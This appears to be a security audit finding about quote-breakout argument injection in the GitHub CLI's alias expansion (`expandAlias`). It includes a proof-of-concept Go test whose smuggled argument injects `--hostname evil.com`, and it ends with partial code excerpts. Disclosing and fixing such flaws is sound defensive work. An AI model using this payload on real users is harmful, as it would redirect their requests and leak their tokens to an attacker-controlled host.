### Title
Alias expansion argument injection via unescaped quote-breakout in `expandAlias` allows attacker-controlled positional values to inject flags like `--hostname`/`-R` - (File: pkg/cmd/root/alias.go)

### Summary
`expandAlias` substitutes `$N` placeholders into the alias expansion string with raw, unsanitized text via `strings.ReplaceAll` *before* the result is tokenized with `shlex.Split`. When an alias uses the officially documented quoted-placeholder pattern (e.g. `--author="$1"`), an attacker-controlled value containing a double-quote character can close the quoted context early and inject brand-new shlex tokens — including flags such as `--hostname` or `-R owner/repo` — into the final argv passed to `root.Execute()`.

### Finding Description
`expandAlias` performs raw string replacement of `$1`, `$2`, etc. directly in the expansion template [1](#0-0) , and only afterward runs `shlex.Split` on the resulting string to build the final argv [2](#0-1) . This ordering means the placeholder value is not treated as an opaque token — it becomes part of the shell-like grammar that `shlex.Split` re-parses.

gh's own documentation/examples encourage quoting placeholders, e.g. `gh alias set epicsBy 'issue list --author="$1" --label="epic"'` [3](#0-2) , and this exact pattern is exercised by the existing unit test showing `--author="$1"` + arg `vilmibm` → single token `--author=vilmibm` [4](#0-3) .

The flaw: if the attacker-controlled value substituted for `$1` contains a literal `"` character, it closes the surrounding quotes early. For expansion `issue list --author="$1"` and args `[]string{`x" --hostname "evil.com`}`, `strings.ReplaceAll` produces:
```
issue list --author="x" --hostname "evil.com"
```
which is a syntactically valid, balanced-quote string. `shlex.Split` then tokenizes it as `["issue","list","--author=x","--hostname","evil.com"]` — a brand-new `--hostname evil.com` argument pair is injected into argv that the alias author never intended, purely because the substituted value happened to contain a quote character.

This result is passed straight to `root.SetArgs(expandedArgs); root.Execute()` in `NewCmdAlias` [5](#0-4) , so the injected `--hostname` (or similarly `-R owner/repo`) is parsed by cobra as a genuine top-level flag for whatever subcommand the alias invokes, changing the host/repo target of the request.

No existing validation stops this: `ValidAliasNameFunc`/`ValidAliasExpansionFunc` only validate the alias definition at `alias set` time (that it resolves to a real command) [6](#0-5) , not the runtime values substituted for `$N`. There is no escaping/quoting of the substituted arg before it is re-embedded into the shlex-parsed expansion string.

### Impact Explanation
An attacker who can get a victim to copy-paste attacker-chosen text (e.g., from an issue title/body, PR title, comment, or gist) as a positional argument to one of their own quoted-placeholder aliases can cause `gh` to append extra, attacker-chosen flags to the expanded command — most notably `--hostname` (redirecting the request, and the victim's token, to an attacker-controlled GHES host) or `-R owner/repo` (redirecting the operation to a different, attacker-chosen repository). This matches the "wrong-host or wrong-account request routing" impact class, and in the `--hostname` case can result in credential/token disclosure to an attacker-controlled host.

### Likelihood Explanation
Exploitability requires: (1) the victim has defined an alias using the commonly-documented quoted-placeholder style (`--flag="$1"`), and (2) the victim manually pastes/types attacker-supplied text containing a `"` character as the alias's argument. This is a real but user-interaction-dependent path — it is not automatically triggered by merely viewing attacker content, but is entirely plausible given gh's own documentation actively promotes this quoting pattern and users routinely copy identifiers (usernames, labels, search terms) from untrusted GitHub content into CLI commands.

### Recommendation
Do not build the final command line via string substitution followed by re-tokenization. Instead, tokenize the expansion template once (identifying `$N` tokens as whole tokens), then substitute each `$N` with the corresponding argument as a single, already-final argv element (never re-parsed by `shlex`). This guarantees a placeholder value can never introduce new tokens/flags regardless of its content (quotes, spaces, leading `-`/`--`).

### Proof of Concept
```go
func TestExpandAlias_QuoteBreakoutInjection(t *testing.T) {
    expansion := `issue list --author="$1"`
    args := []string{`x" --hostname "evil.com`}

    got, err := expandAlias(expansion, args)
    assert.NoError(t, err)

    // BUG: attacker-controlled value breaks out of the quoted placeholder
    // and injects a brand-new --hostname flag/value pair that was never
    // part of the alias definition.
    assert.Equal(t, []string{"issue", "list", "--author=x", "--hostname", "evil.com"}, got)
}
```
Expected (fixed) behavior: the injected value should remain a single opaque argument, e.g. `[]string{"issue", "list", `--author=x" --hostname "evil.com`}`, so no new `--hostname` flag is ever produced regardless of its contents.

func expandAlias(expansion string, args []string) ([]string, error) {
	extraArgs := []string{}
	for i, a := range args {
		if !strings.Contains(expansion, "$") {
			extraArgs = append(extraArgs, a)
		} else {
			expansion = strings.ReplaceAll(expansion, fmt.Sprintf("$%d", i+1), a)
		}
	}

// ValidAliasExpansionFunc returns a function that will check if the given string
// is a valid alias expansion. An expansion is valid if:
//   - it is a shell expansion,
//   - it is a non-shell expansion that corresponds to an existing command, extension, or alias.
func ValidAliasExpansionFunc(cmd *cobra.Command) func(string) bool {
	return func(expansion string) bool {
		if strings.HasPrefix(expansion, "!") {
			return true
		}

		split, err := shlex.Split(expansion)
		if err != nil || len(split) == 0 {
			return false
		}

		rootCmd := cmd.Root()
		cmd, _, _ = rootCmd.Find(split)
		return cmd != rootCmd
	}
}
